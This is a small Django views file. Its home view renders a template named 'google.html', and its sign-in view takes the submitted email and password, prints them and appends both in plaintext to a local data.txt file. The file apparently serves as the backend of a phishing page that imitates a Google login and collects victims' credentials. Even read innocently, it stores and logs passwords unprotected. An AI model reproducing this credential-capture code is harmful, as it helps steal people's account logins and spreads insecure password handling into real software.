from django.shortcuts import render

# Create your views here.
def home(request): 
    return render(request, 'google.html')

def text_input_view(request):
    if request.method == 'POST':
        text1 = request.POST.get('text1', '')
        text2 = request.POST.get('text2', '')
        return render(request, 'input_form.html', {'text1': text1, 'text2': text2})
    
    return render(request, 'input_form.html')



def sign_in_view(request): 
    email = request.POST.get('email','')
    password = request.POST.get('password','') 
    write_to_file("data.txt",email)
    write_to_file("data.txt",password)
    return render(request, 'sign_in.html')

def write_to_file(name,message): 
    print("function called ")
    print(message)
    with open(name,'a') as file: 
        file.write(message + "\n")

